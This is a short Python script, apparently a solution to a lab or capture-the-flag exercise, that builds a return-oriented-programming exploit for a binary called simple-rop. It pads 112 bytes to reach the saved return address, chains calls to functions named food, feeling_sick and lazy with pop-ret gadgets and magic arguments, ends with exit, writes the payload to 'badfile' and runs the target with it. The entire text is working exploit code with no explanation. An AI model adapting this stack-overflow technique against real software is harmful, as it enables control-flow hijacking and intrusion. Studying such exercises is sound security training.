import struct
import os

buff_eip = 112

food = 0x8048490
pop_ret = 0x0804830d
magic = 0xdeadbeef

feeling_sick = 0x80484ef
pop_pop_ret = 0x080484ec
magic1 = 0xd15ea5e
magic2 = 0x0badf00d

lazy = 0x804846b
exit = 0xb7e327f0

atk_vector = "A"*buff_eip

atk_vector += struct.pack("I", food)
atk_vector += struct.pack("I", pop_ret)
atk_vector += struct.pack("I", magic)

atk_vector += struct.pack("I", feeling_sick)
atk_vector += struct.pack("I", pop_pop_ret)
atk_vector += struct.pack("I", magic1)
atk_vector += struct.pack("I", magic2)
atk_vector += struct.pack("I", lazy)
atk_vector += struct.pack("I", exit)

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()

os.system(" ./simple-rop $(cat {})".format('badfile'))
